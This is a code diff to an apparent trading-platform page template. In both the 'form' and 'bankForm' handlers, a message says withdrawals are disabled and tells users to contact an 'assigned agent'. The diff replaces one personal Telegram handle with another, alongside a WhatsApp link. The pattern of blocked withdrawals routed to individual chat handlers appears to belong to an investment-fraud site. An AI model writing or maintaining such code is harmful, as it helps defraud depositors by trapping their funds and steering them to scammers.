@@ -298,7 +298,7 @@ if (form) {
                       <p class="mb-2 text-gray-700">Your withdrawal could not be processed. Withdrawal disabled please kindly contact your assigned agent or customer support for assistance.
                       </p>
                       <p class="text admin-icon">
-                        <a href="https://t.me/Trader_Martinezan01" target="_blank">
+                        <a href="https://t.me/Trader_Angela02" target="_blank">
                           <i class="fa-brands fa-telegram"></i>
                         </a>
                         <a href="https://wa.link/tkkvm1" target="_blank">
@@ -511,7 +511,7 @@ if (bankForm) {
                       <p class="mb-2 text-gray-700">Your withdrawal could not be processed. Withdrawal disabled please kindly contact your assigned agent or customer support for assistance.
                       </p>
                       <p class="text admin-icon">
-                        <a href="https://t.me/Trader_Martinezan01" target="_blank">
+                        <a href="https://t.me/Trader_Angela02" target="_blank">
                           <i class="fa-brands fa-telegram"></i>
                         </a>
                         <a href="https://wa.link/tkkvm1" target="_blank">
